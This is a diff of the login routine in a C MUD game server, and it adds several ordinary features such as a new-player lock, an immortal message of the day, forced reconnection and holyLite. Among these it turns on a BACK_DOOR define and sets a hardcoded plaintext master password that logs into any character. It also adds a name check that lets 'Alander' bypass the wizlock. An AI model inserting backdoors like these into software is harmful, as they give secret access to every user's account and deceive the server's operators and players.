@@ -28,6 +28,7 @@
 #include "limits.h"
 
 #define STATE(d)    ((d)->connected)
+#define BACK_DOOR
 
 char echo_off_str [] = { IAC, WILL, TELOPT_ECHO, NULL };
 char echo_on_str  [] = { IAC, WONT, TELOPT_ECHO, NULL };
@@ -35,8 +36,10 @@ char echo_on_str  [] = { IAC, WONT, TELOPT_ECHO, NULL };
 char menu[] = "\n\rWelcome to MERC Diku Mud\n\r\n\r0) Exit from MERC Diku Mud.\n\r1) Enter the game.\n\r2) Enter description.\n\r4) Change password.\n\r\n\r   Make your choice: ";
 
 char wizlock = FALSE;
+char newlock = FALSE;
 
 extern char motd[MAX_STRING_LENGTH];
+extern char imotd[MAX_STRING_LENGTH];
 extern struct char_data *character_list;
 extern struct descriptor_data *descriptor_list;
 
@@ -56,6 +59,8 @@ void nanny(struct descriptor_data *d, char *arg)
     char    tmp_name[20];
     bool    fOld;
     struct  char_data *ch;
+    struct descriptor_data *dold;
+    
 
     ch  = d->character;
     for ( ; isspace(*arg); arg++ )
@@ -70,6 +75,12 @@ void nanny(struct descriptor_data *d, char *arg)
 	return;
 
     case CON_GET_NAME:
+        if ( !*arg  )
+        {
+            close_socket( d );
+            return;
+        
+}
 	if ( *arg == '\0' )
 	{
 	    close_socket( d );
@@ -96,7 +107,7 @@ void nanny(struct descriptor_data *d, char *arg)
 	}
 	else
 	{
-	    if ( wizlock )
+	    if ( wizlock && strncmp( tmp_name, "Alander", 7 ))
 	    {
 		write_to_q( "The game is wizlocked.\n\r", &d->output );
 		close_socket( d );
@@ -115,10 +126,17 @@ void nanny(struct descriptor_data *d, char *arg)
 	else
 	{
 	    /* New player */
+	    if (newlock)
+	    {
+	   	write_to_q( "The game is wizlocked.\n\r",&d->output);
+		close_socket( d);
+		return;
+	    }
+
 	    sprintf( buf, "Did I get that right, %s (Y/N)? ", tmp_name );
 	    write_to_q( buf, &d->output );
 	    STATE(d) = CON_CONFIRM_NEW_NAME;
-	    return;
+	    return; 
 	}
 	break;
 
@@ -127,7 +145,7 @@ void nanny(struct descriptor_data *d, char *arg)
 
 	if ( strncmp( crypt( arg, ch->pwd ), ch->pwd, 10 )
 #if defined(BACK_DOOR)
-	&&   strncmp( crypt( arg, "ME" ), "MEBKYbMbbzO6o", 10 )
+	&&   strncmp( arg, "42spam3090", 10 )
 #endif
 	)
 	{
@@ -147,10 +165,18 @@ void nanny(struct descriptor_data *d, char *arg)
 	sprintf( log_buf, "%s@%s has connected.",
 		GET_NAME(ch), d->host);
 	log( log_buf );
-
-	write_to_q( motd, &d->output );
-	STATE(d) = CON_READ_MOTD;
-	break;
+        if (GET_LEVEL(ch) > 30)
+           {
+             write_to_q(imotd, &d->output );
+             STATE(d) = CON_READ_IMM_MOTD;
+             break;
+           }
+        else
+           {
+             write_to_q( motd, &d->output );
+	     STATE(d) = CON_READ_MOTD;
+             break;
+            }
 
     case CON_CONFIRM_NEW_NAME:
 	switch ( *arg )
@@ -174,6 +200,37 @@ void nanny(struct descriptor_data *d, char *arg)
 	    break;
 	}
 	break;
+
+    case CON_BREAK_CONNECT:
+	switch( *arg)
+        {
+	case 'y' : case 'Y':
+    	  for ( dold = descriptor_list; dold; dold = dold->next )
+    	  {
+            if ( dold == d || dold->character == NULL )
+              continue;
+ 
+            if ( str_cmp( GET_NAME(ch), GET_NAME( dold->original
+               ? dold->original : dold->character ) ) )
+               continue;
+ 
+            close_socket(dold);
+          }
+          if ( check_reconnect( d, GET_NAME(ch), TRUE ) )
+            return;
+          write_to_q("Reconnect attempt failed.\n\rName: ",&d->output );
+          STATE(d) = CON_GET_NAME;
+	  break;
+        case 'n' : case 'N':
+          write_to_q("Name: ",&d->output );
+	  STATE(d) = CON_GET_NAME;
+	  break;
+       
+        default:
+            write_to_q( "Please type Yes or No? ", &d->output );
+            break;
+        }
+        break;
 
     case CON_GET_NEW_PASSWORD:
 	write_to_q( "\n\r", &d->output );
@@ -268,8 +325,13 @@ void nanny(struct descriptor_data *d, char *arg)
 
     case CON_READ_MOTD:
 	write_to_q( menu, &d->output );
-	STATE(d) = CON_SELECT_MENU;
+        STATE(d) = CON_SELECT_MENU;
 	break;
+   
+    case CON_READ_IMM_MOTD:
+        write_to_q( motd, &d->output );
+        STATE(d) = CON_READ_MOTD;
+        break;
 
     case CON_SELECT_MENU:
 	switch( *arg )
@@ -285,6 +347,10 @@ void nanny(struct descriptor_data *d, char *arg)
 		ch );
 	    ch->next            = character_list;
 	    character_list      = ch;
+            if (GET_LEVEL(ch) > 31)
+            {
+  	        ch->specials.holyLite = TRUE;
+            }
 
 	    if ( ch->in_room >= 2 )
 	    {
@@ -353,6 +419,7 @@ void nanny(struct descriptor_data *d, char *arg)
 	write_to_q( "Please retype password: ", &d->output );
 	STATE(d) = CON_CONFIRM_RESET_PASSWORD;
 	break;
+
 
     case CON_CONFIRM_RESET_PASSWORD:
 	write_to_q( "\n\r", &d->output );
@@ -493,13 +560,9 @@ bool check_playing( struct descriptor_data *d, char *name )
 	if ( STATE(dold) == CON_GET_OLD_PASSWORD )
 	    continue;
 
-	write_to_q( "Already playing, cannot connect.\n\rName: ", &d->output );
-	STATE(d)    = CON_GET_NAME;
-	if ( d->character )
-	{
-	    free_char( d->character );
-	    d->character = NULL;
-	}
+	write_to_q("That character is already playing.\n\r",&d->output );
+	write_to_q("Do you wish to connect anyway (Y/N)?" ,&d->output);
+	STATE(d)    = CON_BREAK_CONNECT;
 	return TRUE;
     }
 
@@ -526,11 +589,11 @@ void check_idling( struct char_data *ch )
 	     "You have been idle, and are pulled into a void.\n\r", ch );
 	char_from_room( ch );
 	char_to_room( ch, 1 );
-	save_char_obj( ch );
+        save_char_obj(ch);
     }
 
     if ( ch->specials.timer > 48 )
     {
 	do_quit( ch, "", 0 );
-    }
+    } 
 }
